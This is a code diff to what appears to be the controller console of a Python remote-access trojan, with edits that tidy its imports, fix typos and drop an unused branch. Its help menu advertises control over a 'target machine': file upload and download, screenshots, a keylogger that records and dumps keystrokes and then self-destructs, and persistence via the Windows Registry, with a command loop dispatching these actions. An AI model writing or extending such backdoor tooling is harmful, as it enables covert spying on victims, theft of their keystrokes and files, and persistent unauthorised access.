@@ -6,21 +6,24 @@
 """
 import os
 import socket
+import sys
+import threading, shutil
+
 import termcolor
 
 
 def help():
     help = """
-        quit                : Quit session with the target
-        clear               : Clear the screen
-        cd <directory>      : Changes directory on target machine
-        upload <filename>   : Upload file to target machine
-        download <filename> : Doanload file to target machine
-        screenshot          : Take a screenshot of target machine
-        keylog start        : Start keylogger
-        keylog dump         : Print keystokes that target inputted
-        keylog stop         : Stop and self destruct keylogger file
-        persistance         : Create persistance in Registry
+    quit                : Quit session with the target
+    clear               : Clear the screen
+    cd <directory>      : Changes directory on target machine
+    upload <filename>   : Upload file to target machine
+    download <filename> : Download file to target machine
+    screenshot          : Take a screenshot of target machine
+    keylog start        : Start keylogger
+    keylog dump         : Print keystokes that target inputted
+    keylog stop         : Stop and self destruct keylogger file
+    persistence         : Create persistence in Registry
     """
     return help
 
@@ -58,10 +61,9 @@ def target_connection():
             break
         elif command == "help":
             print(help())
+
         elif command == "clear":
             os.system("clear")
-        elif command[:2] == "cd":
-            pass
 
         elif command[:6] == "upload":
             upload_file(command[7:])
